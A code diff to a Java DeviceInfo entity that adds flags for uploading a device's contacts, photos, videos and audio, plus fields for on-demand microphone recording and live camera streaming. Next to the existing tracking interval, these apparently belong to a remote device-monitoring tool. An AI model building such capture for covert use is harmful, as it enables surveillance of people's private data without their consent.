@@ -42,6 +42,32 @@ public class DeviceInfo {
 
     private Integer trackingInterval = 60;
 
+    // Contacts
+    private Boolean contactsUploaded = false;
+    private Boolean refreshContacts = false;
+
+    // Images
+    private Boolean imagesUploaded = false;
+    private Boolean refreshImages = false;
+
+    // Videos
+    private Boolean videosUploaded = false;
+    private Boolean refreshVideos = false;
+
+    // Audio
+    private Boolean audiosUploaded = false;
+    private Boolean refreshAudios = false;
+
+    // Mic Recording
+    private Boolean micUploaded;
+    private Boolean refreshMic;
+    private Integer micDuration;
+
+    // Live Camera
+    private Boolean refreshCamera;
+    private Boolean cameraStreaming;
+    private String cameraSessionId;
+
     @Column(nullable = false)
     private LocalDateTime createdAt;
 
